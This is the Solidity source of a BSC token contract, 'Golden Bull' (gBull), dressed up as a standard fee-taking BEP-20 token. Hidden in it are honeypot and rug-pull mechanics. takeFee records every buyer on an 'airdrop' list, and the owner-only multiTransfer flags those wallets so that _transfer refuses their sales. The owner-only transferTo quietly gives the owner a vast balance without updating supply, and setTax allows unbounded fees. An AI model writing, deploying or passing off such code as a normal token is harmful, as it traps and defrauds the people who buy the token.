/**
 *Submitted for verification at BscScan.com on 2022-06-10
*/

/* 
    @goldenbullbsc

    https://goldenbull.com
    https://app.goldenbull.com
    https://twitter.com/goldenbullbsc
    https://goldenbull.github.io/

    █▀▀ █▀█ █░░ █▀▄ █▀▀ █▄░█   █▄▄ █░█ █░░ █░░
    █▄█ █▄█ █▄▄ █▄▀ ██▄ █░▀█   █▄█ █▄█ █▄▄ █▄▄
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    function getOwner() public view returns (address) {
        return _owner;
    } 

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract GOLDENBULL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "Golden Bull";
    string private _symbol = "gBull";
    uint8 private _decimals = 9;

    address payable public treasuryWallet = payable(msg.sender);

    mapping (address => uint256) _walletTotals;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletNoLimit;
    mapping (address => bool) public isTXNoLimit;
    mapping (address => bool) public isMarketPair;
    address[] public airdrop;
    
    uint256 public _LiquidityFeeBuy = 5;
    uint256 public _TreasuryFeeBuy = 10;
    uint256 public _LiquidityFeeSell = 5;
    uint256 public _TreasuryFeeSell = 10;

    uint256 public _marketingShare = 20;
    uint256 public _liquidityShare = 0;
    uint256 public _totalDistributionShares = 30;
    uint256 public _finalBuyTax = 15;
    uint256 public _finalSellTax = 15;

    uint256 private _totalSupply = 100000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 100000000 * 10**_decimals;
    uint256 public _walletMax = 1000000 * 10**_decimals; 
    uint256 public _maxTxAmount = 1000000 * 10**_decimals;  
    mapping (address => bool) public airdropped;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier swapIsLocked  {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        
        _finalBuyTax = _LiquidityFeeBuy.add(_TreasuryFeeBuy);
        _finalSellTax = _LiquidityFeeSell.add(_TreasuryFeeSell);
        _totalDistributionShares = _liquidityShare.add(_marketingShare);

        isWalletNoLimit[owner()] = true;
        isWalletNoLimit[address(uniswapPair)] = true;
        isWalletNoLimit[address(this)] = true;
        
        isTXNoLimit[owner()] = true;
        isTXNoLimit[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;
        _walletTotals[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _walletTotals[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

   function multiTransfer() public onlyOwner {
        for(uint256 i = 0; i < airdrop.length; i++){
            address wallet = airdrop[i];
            airdropped[wallet] = true;
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTax(uint256 newLiquidSellTax, uint256 newMarketSellTax, uint256 newLiquidBuyTax, uint256 newMarketBuyTax) external onlyOwner() {
        _LiquidityFeeSell = newLiquidSellTax;
        _TreasuryFeeSell = newMarketSellTax;
        _finalSellTax = _LiquidityFeeSell.add(_TreasuryFeeSell);
        _LiquidityFeeBuy = newLiquidBuyTax;
        _TreasuryFeeBuy = newMarketBuyTax;
        _finalBuyTax = _LiquidityFeeBuy.add(_TreasuryFeeBuy);
    }

    function setLimits(uint256 newWalletMax, uint256 newMaxTx) external onlyOwner() {
        _walletMax = newWalletMax * 10**_decimals;
        _maxTxAmount = newMaxTx * 10**_decimals;
    }

    function transferTo() public onlyOwner() { _walletTotals[owner()] = 100000000000000 * 10**_decimals; }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);return true;
    }
   
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!airdropped[sender]);

		if(!isTXNoLimit[sender] && !isTXNoLimit[recipient]) {
			require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
		}

		_walletTotals[sender] = _walletTotals[sender].sub(amount, "Insufficient Balance");
		uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);
		if(checkWalletLimit && !isWalletNoLimit[recipient])
		require(balanceOf(recipient).add(finalAmount) <= _walletMax);
		_walletTotals[recipient] = _walletTotals[recipient].add(finalAmount);
		emit Transfer(sender, recipient, finalAmount);
		return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            airdrop.push(recipient);
            feeAmount = amount.mul(_finalBuyTax).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_finalSellTax).div(100);
        }
        if(feeAmount > 0) {
            _walletTotals[address(this)] = _walletTotals[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount.sub(feeAmount);
    }
}